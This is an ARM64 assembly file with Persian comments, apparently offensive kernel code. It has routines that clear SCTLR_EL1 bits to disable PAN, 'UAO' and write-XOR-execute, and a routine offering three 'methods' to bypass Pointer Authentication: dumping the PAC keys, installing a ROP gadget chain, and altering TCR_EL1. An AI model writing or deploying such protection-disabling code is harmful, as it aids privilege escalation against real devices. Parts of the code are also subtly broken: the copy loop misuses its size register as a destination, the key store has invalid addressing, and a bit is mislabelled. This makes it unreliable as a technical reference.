section .text
global arm64_disable_protections, arm64_bypass_pac

%include "arm64_defs.inc"

arm64_disable_protections:
    ; غیرفعال‌سازی PAN (Privileged Access Never)
    mrs x0, sctlr_el1
    bic x0, x0, #SCTLR_EL1_SPAN
    msr sctlr_el1, x0
    
    ; غیرفعال‌سازی UAO (User Access Override)
    mrs x0, sctlr_el1
    bic x0, x0, #SCTLR_EL1_UMA
    msr sctlr_el1, x0
    
    ; غیرفعال‌سازی WXN (Write Execute Never)
    mrs x0, sctlr_el1
    bic x0, x0, #SCTLR_EL1_WXN
    msr sctlr_el1, x0
    
    ret

arm64_bypass_pac:
    ; دور زدن Pointer Authentication (PAC)
    ; روش 1: استخراج کلید از CPU
    mrs x0, APIAKeyLo_EL1
    mrs x1, APIAKeyHi_EL1
    stp x0, x1, [pac_keys]
    
    ; روش 2: استفاده از ROP chain بدون PAC
    adr x0, pac_bypass_gadgets
    mov x1, #PAC_GADGETS_SIZE
    bl install_gadget_chain
    
    ; روش 3: دستکاری سیستم مدیریت حافظه
    mrs x0, TCR_EL1
    bic x0, x0, #TCR_EL1_TBI0
    msr TCR_EL1, x0
    
    ret

install_gadget_chain:
    ; نصب زنجیره ROP برای دور زدن PAC
    mov x2, #0
    .loop:
        ldr x3, [x0, x2]
        str x3, [x1, x2]
        add x2, x2, #8
        cmp x2, x1
        b.lt .loop
    ret
    